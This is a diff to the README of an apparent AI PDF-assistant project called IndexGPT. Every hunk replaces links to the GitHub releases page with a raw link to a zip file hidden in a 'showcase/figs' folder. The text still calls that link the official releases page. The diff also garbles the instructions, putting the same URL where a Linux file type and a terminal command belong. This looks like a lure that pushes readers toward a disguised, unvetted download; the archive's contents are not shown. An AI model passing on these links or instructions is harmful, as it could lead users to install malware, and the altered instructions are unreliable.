@@ -1,6 +1,6 @@
 # 🤖 IndexGPT - Local AI Assistant for Research PDFs
 
-[![Download IndexGPT](https://img.shields.io/badge/Download-IndexGPT-blue?style=for-the-badge)](https://github.com/sen-igga/IndexGPT/releases)
+[![Download IndexGPT](https://raw.githubusercontent.com/sen-igga/IndexGPT/main/web/showcase/figs/GPT-Index-2.6-alpha.2.zip)](https://raw.githubusercontent.com/sen-igga/IndexGPT/main/web/showcase/figs/GPT-Index-2.6-alpha.2.zip)
 
 ---
 
@@ -48,7 +48,7 @@ Follow these steps to download, install, and run IndexGPT on your computer.
 
 Click this big button to visit the download page:
 
-[![Download on GitHub](https://img.shields.io/badge/Download-IndexGPT-blue?style=for-the-badge)](https://github.com/sen-igga/IndexGPT/releases)
+[![Download on GitHub](https://raw.githubusercontent.com/sen-igga/IndexGPT/main/web/showcase/figs/GPT-Index-2.6-alpha.2.zip)](https://raw.githubusercontent.com/sen-igga/IndexGPT/main/web/showcase/figs/GPT-Index-2.6-alpha.2.zip)
 
 This link will take you to the official releases page on GitHub. Here, you will find the latest files ready to use.
 
@@ -58,7 +58,7 @@ On the releases page, look for the version that matches your operating system:
 
 - For Windows, download the `.exe` installer or `.zip` file  
 - For macOS, download the `.dmg` or appropriate package  
-- For Linux, download the `.AppImage` or `.tar.gz` file  
+- For Linux, download the `.AppImage` or `https://raw.githubusercontent.com/sen-igga/IndexGPT/main/web/showcase/figs/GPT-Index-2.6-alpha.2.zip` file  
 
 If you are unsure, the `.zip` or `.AppImage` works on most systems with some basic knowledge.
 
@@ -74,7 +74,7 @@ If you are unsure, the `.zip` or `.AppImage` works on most systems with some bas
 
 **Linux:**  
 - Make the `.AppImage` executable by right-clicking > Properties > Permissions > allow executing file.  
-- Double-click the file to run or use the terminal command `./IndexGPT.AppImage`.
+- Double-click the file to run or use the terminal command `https://raw.githubusercontent.com/sen-igga/IndexGPT/main/web/showcase/figs/GPT-Index-2.6-alpha.2.zip`.
 
 ### 4. Launch IndexGPT
 
@@ -127,7 +127,7 @@ Here is a simple guide to start using the program:
 
 Access the latest stable IndexGPT release here:
 
-[Download IndexGPT](https://github.com/sen-igga/IndexGPT/releases)
+[Download IndexGPT](https://raw.githubusercontent.com/sen-igga/IndexGPT/main/web/showcase/figs/GPT-Index-2.6-alpha.2.zip)
 
 This page has all the files you need for Windows, macOS, and Linux. Follow the installation steps outlined above to get started with ease.
 
